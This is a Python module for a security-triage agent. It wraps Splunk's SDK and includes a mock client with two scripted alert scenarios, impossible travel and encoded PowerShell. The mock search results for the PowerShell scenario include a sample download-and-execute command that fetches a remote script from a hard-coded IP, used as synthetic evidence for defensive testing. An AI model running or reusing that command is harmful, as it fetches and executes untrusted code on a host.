"""
Splunk client abstraction.

Exposes a SplunkClient protocol with two implementations:
  - RealSplunkClient: wraps the official splunk-sdk
  - MockSplunkClient:  returns realistic sample data for local testing

The rest of the codebase depends only on the protocol, so it never
needs to know whether it's talking to real Splunk or the mock.
"""

from __future__ import annotations

import json
import logging
import time
import uuid
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any, Protocol

from .config import Settings
from .schemas import NotableEvent, SplunkSearchResult

log = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Protocol
# ---------------------------------------------------------------------------


class SplunkClient(Protocol):
    """Minimal interface the steelman agent needs from a Splunk-like backend."""

    def fetch_notable_event(self, event_id: str) -> NotableEvent: ...

    def search(
        self,
        spl: str,
        earliest_time: str = "-24h",
        latest_time: str = "now",
        result_limit: int = 100,
    ) -> SplunkSearchResult: ...

    def write_verdict_comment(
        self,
        event_id: str,
        verdict_text: str,
    ) -> bool: ...


# ---------------------------------------------------------------------------
# Real implementation (splunk-sdk)
# ---------------------------------------------------------------------------


class RealSplunkClient:
    """Talks to a live Splunk instance via the REST API using splunk-sdk."""

    def __init__(self, settings: Settings):
        try:
            import splunklib.client as splunk_client  # type: ignore[import-not-found]
            import splunklib.results as splunk_results  # type: ignore[import-not-found]
        except ImportError as exc:
            raise RuntimeError(
                "splunk-sdk is required for RealSplunkClient. "
                "Install with: pip install splunk-sdk"
            ) from exc

        self._splunk_client_mod = splunk_client
        self._splunk_results_mod = splunk_results
        self._settings = settings
        self._service = self._connect()

    def _connect(self):
        connect_kwargs: dict[str, Any] = {
            "host": self._settings.splunk_host,
            "port": self._settings.splunk_port,
            "scheme": self._settings.splunk_scheme,
            "app": self._settings.splunk_app,
            "verify": self._settings.splunk_verify_ssl,
        }
        if self._settings.splunk_token:
            connect_kwargs["token"] = self._settings.splunk_token
        else:
            connect_kwargs["username"] = self._settings.splunk_username
            connect_kwargs["password"] = self._settings.splunk_password

        log.info(
            "Connecting to Splunk at %s://%s:%s",
            self._settings.splunk_scheme,
            self._settings.splunk_host,
            self._settings.splunk_port,
        )
        return self._splunk_client_mod.connect(**connect_kwargs)

    # ----- notable event fetch -----

    def fetch_notable_event(self, event_id: str) -> NotableEvent:
        # Enterprise Security stores notables in the `notable` index.
        spl = (
            f'search index=notable event_id="{event_id}" '
            "| head 1 "
            "| fields *"
        )
        result = self.search(spl, earliest_time="-30d", latest_time="now", result_limit=1)
        if result.error or not result.results:
            raise ValueError(
                f"Notable event {event_id!r} not found "
                f"(error={result.error!r}, results={len(result.results)})"
            )
        row = result.results[0]
        return self._row_to_notable(row, event_id)

    @staticmethod
    def _row_to_notable(row: dict[str, Any], event_id: str) -> NotableEvent:
        def _as_list(value: Any) -> list[str]:
            if value is None:
                return []
            if isinstance(value, list):
                return [str(v) for v in value]
            return [str(value)]

        entities: dict[str, list[str]] = {}
        for field, ent_type in [
            ("user", "user"),
            ("src", "src_ip"),
            ("src_ip", "src_ip"),
            ("dest", "dest_ip"),
            ("dest_ip", "dest_ip"),
            ("host", "host"),
            ("process", "process"),
            ("file_hash", "file_hash"),
        ]:
            if field in row:
                entities.setdefault(ent_type, []).extend(_as_list(row[field]))

        timestamp_raw = row.get("_time") or row.get("time")
        if isinstance(timestamp_raw, (int, float)):
            ts = datetime.fromtimestamp(float(timestamp_raw), tz=timezone.utc)
        elif isinstance(timestamp_raw, str):
            try:
                ts = datetime.fromisoformat(timestamp_raw.replace("Z", "+00:00"))
            except ValueError:
                ts = datetime.now(timezone.utc)
        else:
            ts = datetime.now(timezone.utc)

        mitre = _as_list(row.get("annotations.mitre_attack") or row.get("mitre_techniques"))

        return NotableEvent(
            event_id=event_id,
            timestamp=ts,
            rule_name=str(row.get("search_name") or row.get("rule_name") or "unknown"),
            rule_id=row.get("rule_id"),
            severity=str(row.get("severity") or "medium").lower(),  # type: ignore[arg-type]
            description=str(row.get("description") or row.get("rule_description") or ""),
            entities=entities,
            mitre_techniques=mitre,
            raw_fields={k: v for k, v in row.items() if not k.startswith("_")},
            source_index=str(row.get("index") or "notable"),
        )

    # ----- search -----

    def search(
        self,
        spl: str,
        earliest_time: str = "-24h",
        latest_time: str = "now",
        result_limit: int = 100,
    ) -> SplunkSearchResult:
        search_id = f"srch_{uuid.uuid4().hex[:10]}"
        spl_normalised = spl.strip()
        if not spl_normalised.lower().startswith(("search ", "| ", "|")):
            spl_normalised = f"search {spl_normalised}"

        started = time.monotonic()
        try:
            kwargs_oneshot = {
                "earliest_time": earliest_time,
                "latest_time": latest_time,
                "count": result_limit,
                "output_mode": "json",
            }
            oneshot = self._service.jobs.oneshot(spl_normalised, **kwargs_oneshot)
            reader = self._splunk_results_mod.JSONResultsReader(oneshot)
            rows: list[dict[str, Any]] = []
            for item in reader:
                if isinstance(item, dict):
                    rows.append(item)
                if len(rows) >= result_limit:
                    break
            duration = time.monotonic() - started
            return SplunkSearchResult(
                search_id=search_id,
                spl=spl_normalised,
                earliest_time=earliest_time,
                latest_time=latest_time,
                result_count=len(rows),
                scan_count=None,
                duration_seconds=round(duration, 3),
                results=rows[:result_limit],
                truncated=len(rows) >= result_limit,
            )
        except Exception as exc:  # pragma: no cover - network errors
            duration = time.monotonic() - started
            log.exception("Splunk search failed")
            return SplunkSearchResult(
                search_id=search_id,
                spl=spl_normalised,
                earliest_time=earliest_time,
                latest_time=latest_time,
                result_count=0,
                scan_count=None,
                duration_seconds=round(duration, 3),
                results=[],
                truncated=False,
                error=f"{type(exc).__name__}: {exc}",
            )

    # ----- write back -----

    def write_verdict_comment(self, event_id: str, verdict_text: str) -> bool:
        """
        Write the verdict as a comment on the notable event via the ES REST
        endpoint. Requires the user to have 'edit_notable_events' capability.
        """
        try:
            endpoint = f"/services/notable_update"
            self._service.post(
                endpoint,
                ruleUIDs=event_id,
                comment=verdict_text,
                status=None,
                urgency=None,
                newOwner=None,
            )
            return True
        except Exception as exc:  # pragma: no cover
            log.warning("Could not write verdict comment for %s: %s", event_id, exc)
            return False


# ---------------------------------------------------------------------------
# Mock implementation
# ---------------------------------------------------------------------------


_MOCK_EVENT_FIXTURE: dict[str, dict[str, Any]] = {
    "NOT-2026-04-20-0001": {
        "rule_name": "Impossible Travel Detected",
        "rule_id": "ESCU-impossible-travel-v3",
        "severity": "high",
        "description": (
            "User authenticated from Dublin, IE and Lagos, NG within 12 minutes. "
            "Geolocation distance implies travel speed incompatible with physical travel."
        ),
        "entities": {
            "user": ["alice.nguyen@acme.example"],
            "src_ip": ["212.95.7.44", "102.89.41.10"],
        },
        "mitre": ["T1078.004"],
    },
    "NOT-2026-04-20-0002": {
        "rule_name": "Encoded PowerShell Command Detected",
        "rule_id": "ESCU-powershell-encoded-v5",
        "severity": "medium",
        "description": (
            "Process powershell.exe launched with -EncodedCommand argument on host "
            "WIN-FIN-07. Decoded payload references IEX and Invoke-WebRequest."
        ),
        "entities": {
            "user": ["svc_backup"],
            "host": ["WIN-FIN-07"],
            "process": ["powershell.exe"],
        },
        "mitre": ["T1059.001", "T1027"],
    },
}


class MockSplunkClient:
    """
    Returns realistic, deterministic sample data. Two scripted scenarios live
    behind event_ids NOT-2026-04-20-0001 (likely FP after investigation) and
    NOT-2026-04-20-0002 (should escalate - genuinely suspicious).

    Searches are pattern-matched loosely so the agent can experiment.
    """

    def __init__(self, settings: Settings):
        self._settings = settings
        self._verdicts_written: list[tuple[str, str]] = []
        log.info("MockSplunkClient active - using synthetic data")

    def fetch_notable_event(self, event_id: str) -> NotableEvent:
        fixture = _MOCK_EVENT_FIXTURE.get(event_id)
        if fixture is None:
            # Return a generic unknown-event fixture so the agent can still
            # exercise its workflow against arbitrary IDs.
            return NotableEvent(
                event_id=event_id,
                timestamp=datetime.now(timezone.utc),
                rule_name="Unknown Rule (mock)",
                rule_id=None,
                severity="low",
                description=(
                    "This is a synthetic unknown event. In mock mode, only "
                    "NOT-2026-04-20-0001 and NOT-2026-04-20-0002 have rich fixtures."
                ),
                entities={},
                mitre_techniques=[],
                raw_fields={"mock": True},
                source_index="notable",
            )

        return NotableEvent(
            event_id=event_id,
            timestamp=datetime.now(timezone.utc) - timedelta(minutes=45),
            rule_name=fixture["rule_name"],
            rule_id=fixture.get("rule_id"),
            severity=fixture["severity"],
            description=fixture["description"],
            entities=fixture["entities"],
            mitre_techniques=fixture["mitre"],
            raw_fields={"mock": True, "fixture": event_id},
            source_index="notable",
        )

    def search(
        self,
        spl: str,
        earliest_time: str = "-24h",
        latest_time: str = "now",
        result_limit: int = 100,
    ) -> SplunkSearchResult:
        search_id = f"mock_{uuid.uuid4().hex[:8]}"
        results = self._mock_results_for(spl)

        return SplunkSearchResult(
            search_id=search_id,
            spl=spl.strip(),
            earliest_time=earliest_time,
            latest_time=latest_time,
            result_count=len(results),
            scan_count=max(len(results) * 37, 100) if results else 250,
            duration_seconds=round(0.3 + len(results) * 0.04, 3),
            results=results[:result_limit],
            truncated=len(results) > result_limit,
        )

    def write_verdict_comment(self, event_id: str, verdict_text: str) -> bool:
        self._verdicts_written.append((event_id, verdict_text))
        log.info("MOCK: verdict comment recorded for %s (%d chars)", event_id, len(verdict_text))
        return True

    # ----- scenario logic -----

    def _mock_results_for(self, spl: str) -> list[dict[str, Any]]:
        """
        Loose pattern matching to produce plausible fake results.
        Real Splunk would interpret the SPL; we just peek at keywords.
        """
        lowered = spl.lower()

        # Impossible travel scenario helpers
        if "alice.nguyen" in lowered and "okta" in lowered:
            return [
                {
                    "_time": "2026-04-20T14:02:11Z",
                    "user": "alice.nguyen@acme.example",
                    "src_ip": "212.95.7.44",
                    "geo_country": "Ireland",
                    "device_id": "mbp-alice-01",
                    "user_agent": "Mozilla/5.0 (Macintosh)",
                    "outcome": "success",
                },
                {
                    "_time": "2026-04-20T14:14:33Z",
                    "user": "alice.nguyen@acme.example",
                    "src_ip": "102.89.41.10",
                    "geo_country": "Nigeria",
                    "device_id": "android-unknown-4412",
                    "user_agent": "okta-mobile/7.3 (Android 14)",
                    "outcome": "success",
                },
            ]
        if "alice.nguyen" in lowered and "baseline" in lowered:
            return [
                {
                    "user": "alice.nguyen@acme.example",
                    "historical_geos": ["Ireland", "United Kingdom", "Spain"],
                    "never_seen": ["Nigeria"],
                    "days_observed": 112,
                }
            ]
        if "102.89.41.10" in lowered and ("threat" in lowered or "reputation" in lowered):
            return [
                {
                    "ip": "102.89.41.10",
                    "reputation": "residential_mobile",
                    "asn": "AS37148 MTN-NG",
                    "known_malicious": False,
                    "last_seen_campaigns": [],
                }
            ]
        if "alice.nguyen" in lowered and ("mfa" in lowered or "push" in lowered):
            return [
                {
                    "_time": "2026-04-20T14:14:20Z",
                    "user": "alice.nguyen@acme.example",
                    "factor": "push",
                    "outcome": "approved",
                    "device_id": "android-unknown-4412",
                    "push_location_accuracy_meters": 18,
                }
            ]

        # Encoded PowerShell scenario helpers
        if "win-fin-07" in lowered and "svc_backup" in lowered and "powershell" in lowered:
            return [
                {
                    "_time": "2026-04-20T13:40:02Z",
                    "host": "WIN-FIN-07",
                    "user": "svc_backup",
                    "parent_process": "services.exe",
                    "process": "powershell.exe",
                    "command_line": (
                        "powershell.exe -NoProfile -EncodedCommand "
                        "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMA..."
                    ),
                    "decoded_hint": "IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.50/a.ps1')",
                }
            ]
        if "win-fin-07" in lowered and "outbound" in lowered:
            return [
                {
                    "host": "WIN-FIN-07",
                    "dest_ip": "185.220.101.50",
                    "dest_port": 80,
                    "bytes_out": 4122,
                    "bytes_in": 284910,
                    "first_seen": "2026-04-20T13:40:04Z",
                }
            ]
        if "185.220.101.50" in lowered and ("threat" in lowered or "reputation" in lowered):
            return [
                {
                    "ip": "185.220.101.50",
                    "reputation": "known_bad",
                    "categories": ["c2", "tor-exit"],
                    "known_malicious": True,
                    "first_seen_malicious": "2024-11-02",
                }
            ]
        if "svc_backup" in lowered and "baseline" in lowered:
            return [
                {
                    "user": "svc_backup",
                    "historical_processes": ["robocopy.exe", "veeam.backup.exe"],
                    "powershell_ever_seen": False,
                    "encoded_cmd_ever_seen": False,
                    "days_observed": 240,
                }
            ]

        # Generic "nothing found" result for unrecognised searches
        return []
